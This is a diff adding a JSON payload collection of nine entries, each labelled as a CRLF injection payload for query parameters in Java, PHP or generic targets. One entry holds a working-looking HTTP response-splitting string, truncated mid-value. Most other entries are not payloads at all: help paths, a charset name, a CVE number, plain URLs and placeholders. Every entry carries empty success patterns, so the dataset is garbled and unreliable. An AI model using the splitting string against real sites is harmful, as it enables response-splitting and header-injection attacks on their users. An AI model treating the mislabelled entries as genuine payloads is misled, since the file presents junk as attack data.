@@ -1,0 +1,101 @@
+[
+  {
+    "payload_id": "OWP-57285",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Java",
+    "injection_point": "query_parameter",
+    "payload_string": "/help/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57386",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Java",
+    "injection_point": "query_parameter",
+    "payload_string": "iso-8859-1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57388",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Java",
+    "injection_point": "query_parameter",
+    "payload_string": "1-79-1215353.1-1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57590",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://www.rec-sec.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-57691",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "CVE-2015-5285",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-61550",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "http://www.google.it",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-62334",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-62391",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "[CRLF]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-64272",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "PHP",
+    "injection_point": "query_parameter",
+    "payload_string": "[url_redirect_to]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
